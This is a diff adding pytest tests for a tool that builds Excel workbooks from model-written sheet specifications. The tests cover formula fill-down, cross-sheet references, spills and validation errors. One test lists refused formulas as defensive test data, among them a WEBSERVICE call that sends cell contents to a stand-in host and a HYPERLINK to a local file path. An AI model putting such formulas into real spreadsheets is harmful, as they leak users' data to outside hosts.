@@ -1041,3 +1041,215 @@ def test_dde_header_and_sheet_name_are_refused():
 def test_ordinary_text_with_signs_or_pipes_is_kept(text):
     ws = _ws(_sheet(columns=[{"header": "Note"}], rows=[[text]]))
     assert ws["A2"].value == text
+
+
+# --- Model-written formulas -----------------------------------------------------
+
+ORDERS = _sheet(
+    "Commandes",
+    columns=[
+        {"header": "Client"},
+        {"header": "Produit"},
+        {"header": "Qté", "type": "integer", "total": "sum"},
+        {
+            "header": "Prix",
+            "type": "currency",
+            "currency": "EUR",
+            "formula": '=XLOOKUP(B2,Tarifs!A2:A3,Tarifs!B2:B3,"")',
+        },
+        {"header": "Montant", "type": "currency", "formula": "=C2*D2", "total": "sum"},
+    ],
+    rows=[["Alpha", "Vis", 3, None, None], ["Beta", "Clou", 10, None, None]],
+)
+PRICES = _sheet(
+    "Tarifs",
+    columns=[{"header": "Produit"}, {"header": "Prix", "type": "currency"}],
+    rows=[["vis", 1.5], ["Clou", 0.2]],
+)
+SUMMARY = _sheet(
+    "Synthèse 2025",
+    columns=[{"header": "Indicateur"}, {"header": "Valeur", "type": "number"}],
+    rows=[
+        ["CA", {"formula": "=SUM(Commandes!E2:E3)"}],
+        ["Clients", {"formula": "=COUNTA(Commandes!A2:A3)"}],
+        ["Vis", {"formula": '=SUMIFS(Commandes!C2:C3,Commandes!B2:B3,"vis")'}],
+    ],
+)
+
+
+def _sheet_xml(data: bytes, index: int) -> str:
+    with zipfile.ZipFile(io.BytesIO(data)) as archive:
+        return archive.read(f"xl/worksheets/sheet{index}.xml").decode()
+
+
+def test_column_formula_fills_down_with_cached_values_and_prefixes():
+    data = _xlsx(ORDERS, PRICES)
+    ws = load_workbook(io.BytesIO(data))["Commandes"]
+    cached = load_workbook(io.BytesIO(data), data_only=True)["Commandes"]
+    # A range without $ is anchored: every row reads the whole table.
+    # XlsxWriter stores XLOOKUP as a (one-cell) dynamic array formula.
+    assert ws["D3"].value.text == (
+        '=_xlfn.XLOOKUP(B3,Tarifs!$A$2:$A$3,Tarifs!$B$2:$B$3,"")'
+    )
+    assert ws["E3"].value == "=C3*D3"
+    assert [cached[c].value for c in ("D2", "D3", "E2", "E3", "E4")] == [
+        1.5,
+        0.2,
+        4.5,
+        2,
+        6.5,
+    ]
+    assert "_xlfn.XLOOKUP(B2" in _sheet_xml(data, 1)
+
+
+def test_summary_sheet_reads_other_sheets_with_cached_values():
+    data = _xlsx(ORDERS, PRICES, SUMMARY)
+    ws = load_workbook(io.BytesIO(data))["Synthèse 2025"]
+    cached = load_workbook(io.BytesIO(data), data_only=True)["Synthèse 2025"]
+    assert ws["B2"].value == "=SUM(Commandes!E2:E3)"
+    assert [cached[c].value for c in ("B2", "B3", "B4")] == [6.5, 2, 3]
+    preview = json.loads(build_preview(prepare(_request(ORDERS, PRICES, SUMMARY))))
+    summary = preview["sheets"][2]
+    assert [row[1] for row in summary["rows"]] == [6.5, 2, 3]
+    assert summary["cell_formulas"]["B2"] == "=SUM(Commandes!E2:E3)"
+
+
+def test_reference_to_a_quoted_sheet_name_is_written_canonically():
+    sheet = _sheet(
+        "Bilan",
+        columns=[{"header": "Total", "type": "number"}],
+        rows=[[{"formula": "=SUM(Synthèse 2025!B2:B3)"}]],
+    )
+    data = _xlsx(ORDERS, PRICES, SUMMARY, sheet)
+    ws = load_workbook(io.BytesIO(data))["Bilan"]
+    assert ws["A2"].value == "=SUM('Synthèse 2025'!B2:B3)"
+    assert load_workbook(io.BytesIO(data), data_only=True)["Bilan"]["A2"].value == 8.5
+
+
+def test_filter_spills_as_a_dynamic_array():
+    sheet = _sheet(
+        "Gros clients",
+        columns=[{"header": "Client"}, {"header": "Qté", "type": "integer"}],
+        rows=[[{"formula": "=FILTER(Commandes!A2:B3,Commandes!C2:C3>5)"}, None]],
+    )
+    data = _xlsx(ORDERS, PRICES, sheet)
+    xml = _sheet_xml(data, 3)
+    assert 'cm="1"' in xml and "_xlfn._xlws.FILTER(" in xml
+    assert '<f t="array" ref="A2:B2"' in xml
+    preview = json.loads(build_preview(prepare(_request(ORDERS, PRICES, sheet))))
+    assert preview["sheets"][2]["rows"] == [["Beta", "Clou"]]
+
+
+def test_spill_into_a_filled_cell_names_the_cell():
+    sheet = _sheet(
+        "Liste",
+        columns=[{"header": "Client"}],
+        rows=[[{"formula": "=SORT(Commandes!A2:A3)"}], ["occupé"]],
+    )
+    message = _error(ORDERS, PRICES, sheet)
+    assert "Sheet 'Liste', cell A2" in message and "A3 is not empty" in message
+
+
+@pytest.mark.parametrize(
+    ("formula", "fragment"),
+    [
+        ('=WEBSERVICE("https://x.example/?"&A2)', "WEBSERVICE is not accepted"),
+        ('=HYPERLINK("file:///C:/x")', "HYPERLINK is not accepted"),
+        ('=INDIRECT("B"&A2)', "INDIRECT is not accepted"),
+        ("=SUM(Inconnu!B2:B3)", "sheet 'Inconnu' does not exist"),
+        ("=SUM(Commandes!E2:E4)", "would count the totals row 4"),
+        ("=SOMME(Commandes!E2:E3)", "SUM instead of SOMME"),
+    ],
+)
+def test_refused_formula_names_sheet_cell_and_fix(formula, fragment):
+    sheet = _sheet(
+        "S",
+        columns=[{"header": "V", "type": "number"}],
+        rows=[[{"formula": formula}]],
+    )
+    message = _error(ORDERS, PRICES, sheet)
+    assert "Sheet 'S', row 2, column 1 ('V'): formula" in message
+    assert fragment in message
+
+
+def test_plain_string_formula_gets_the_formula_cell_form():
+    message = _error(
+        _sheet(columns=[{"header": "V", "type": "number"}], rows=[["=SUM(A1:A2)"]])
+    )
+    assert '{"formula": "=SUM(A1:A2)"}' in message
+
+
+def test_quoted_text_inside_a_formula_is_kept_as_written():
+    sheet = _sheet(
+        columns=[{"header": "Note"}],
+        rows=[[{"formula": '="SORT(" & "FILTER("'}]],
+    )
+    # XlsxWriter writes any formula naming SORT( as a one-cell dynamic array.
+    assert _ws(sheet)["A2"].value.text == '="SORT("&"FILTER("'
+
+
+def test_formula_column_with_text_results_becomes_text():
+    sheet = _sheet(
+        columns=[{"header": "Nom"}, {"header": "Initiale", "formula": "=LEFT(A2,1)"}],
+        rows=[["Alice", None]],
+    )
+    prepared = prepare(_request(sheet))
+    assert prepared.sheets[0].columns[1].type == "text"
+    assert prepared.sheets[0].rows[0][1] == "A"
+
+
+def test_compute_and_formula_on_one_column_is_refused():
+    column = {
+        "header": "X",
+        "formula": "=1",
+        "compute": {"op": "add", "left": 1, "right": "Y"},
+    }
+    message = _error(_sheet(columns=[{"header": "Y", "type": "number"}, column]))
+    assert "either `compute` or `formula`" in message
+
+
+def test_compute_on_a_formula_column_is_protected_from_empty_results():
+    sheet = _sheet(
+        columns=[
+            {"header": "A", "type": "number"},
+            {"header": "B", "formula": '=IF(A2>0,A2,"")'},
+            {"header": "C", "compute": {"op": "multiply", "left": "B", "right": 2}},
+        ],
+        rows=[[1, None, None], [-1, None, None]],
+    )
+    ws = _ws(sheet)
+    assert ws["C2"].value == '=IFERROR(B2*2,"")'
+
+
+def test_model_formula_count_is_bounded():
+    rows = [[{"formula": "=1"}] for _ in range(5001)]
+    message = _error(_sheet(columns=[{"header": "V", "type": "number"}], rows=rows))
+    assert "rows; the limit is" in message or "formula cells" in message
+
+
+def test_column_formula_reading_another_row_previews_per_cell():
+    sheet = _sheet(
+        columns=[
+            {"header": "V", "type": "number"},
+            {"header": "Cumul", "formula": "=IFERROR(B1+A2,A2)"},
+        ],
+        rows=[[1, None], [2, None]],
+    )
+    preview = json.loads(build_preview(prepare(_request(sheet))))["sheets"][0]
+    assert "formula" not in preview["columns"][1]
+    assert preview["cell_formulas"] == {
+        "B2": "=IFERROR(B1+A2,A2)",
+        "B3": "=IFERROR(B2+A3,A3)",
+    }
+    assert [row[1] for row in preview["rows"]] == [1, 3]
+
+
+def test_fixed_cell_without_dollar_in_a_column_formula_gets_the_hint():
+    sheet = _sheet(
+        columns=[
+            {"header": "V", "type": "number"},
+            {"header": "Part", "formula": "=A2/A4"},
+        ],
+        rows=[[1, None], [2, None], [3, None]],
+    )
+    assert "must be written with $" in _error(sheet)
